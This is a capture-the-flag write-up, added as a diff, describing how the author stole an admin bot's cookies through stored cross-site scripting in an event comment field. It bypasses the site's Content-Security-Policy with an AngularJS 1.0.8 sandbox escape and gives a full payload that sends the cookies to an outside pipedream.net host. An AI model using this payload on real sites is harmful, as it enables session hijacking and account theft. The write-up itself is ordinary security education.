@@ -1,0 +1,32 @@
+In order to get the flag I had to steal the admin coockies from his session. 
+Obviously the admin is emulated from a bot, to whom I had to send a malicious link.
+To create the malicious link I have to use some vulnerability in the website. 
+
+In this case I searched for a vulnerability by injecting a simple script (<script>alert(1)</script>)
+in every possible form field. By looking which one was doing somenthing strange I was able to 
+undestand a vulnerability. 
+
+In this case in the section "comment" of an event the html sanitazier doesn't work properly.
+Unfortunaly the script doesn't run because of the Content-Security-Policy: it doesn't run code outside
+this domanins 
+
+default-src https://www.google.com https://ajax.googleapis.com 'unsafe-eval'; 
+style-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/; 
+font-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;
+object-src 'none'
+
+so I had to look in the web for other vulnerabilities. 
+After a lot I found this
+<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script><div ng-app ng-csp>{{#code}}</div>
+
+a vulnerability from angularjs and ajax api. Inside #code I could execute the code I want to, so
+I crafted the following code
+
+$on.constructor('document.location="https://enwmrr6eb6wa.x.pipedream.net/?"+document.coockie')()
+
+basically this code makes a get req to the website https://enwmrr6eb6wa.x.pipedream.net/ (a web tool
+for testing get req) with the coockies as parameter. 
+
+The entire code was this:
+
+<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script><div ng-app ng-csp>{{$on.constructor('document.location="https://enwmrr6eb6wa.x.pipedream.net/?"+document.coockie')()}}</div>
